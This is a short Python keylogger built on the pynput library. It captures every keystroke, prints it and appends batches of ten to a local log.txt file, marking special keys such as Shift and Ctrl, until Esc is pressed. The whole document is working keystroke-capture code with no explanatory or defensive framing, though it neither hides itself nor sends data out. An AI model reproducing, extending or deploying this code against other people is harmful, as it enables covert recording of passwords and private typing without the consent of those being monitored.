import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        f.write('\n')
        for key in keys:
            # Convert key object to string and clean formatting
            k = str(key).replace("'", "")
            if k == "Key.space":
                f.write(" ")
            elif "Key" not in k:
                f.write(k)
            else:
                f.write(f"[{k}]")  # Log special keys like Shift, Ctrl, etc.

def on_release(key):
    if key == Key.esc:
        # Stop listener on 'Esc' key press
        return False

# Set up the keyboard listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
